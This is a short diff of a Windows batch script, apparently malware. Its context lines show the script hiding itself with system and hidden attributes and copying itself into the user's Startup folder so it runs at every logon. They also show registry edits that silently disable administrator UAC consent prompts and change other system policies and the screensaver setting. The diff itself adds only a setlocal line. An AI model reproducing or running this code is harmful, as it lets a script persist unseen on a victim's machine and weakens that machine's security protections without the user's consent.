@@ -1,4 +1,5 @@
 @echo off
+setlocal enabledelayedexpansion
 
 attrib +s +h +i +l +x +a "%0" >nul
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
@@ -101,3 +102,4 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Und
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
 reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f >nul
+
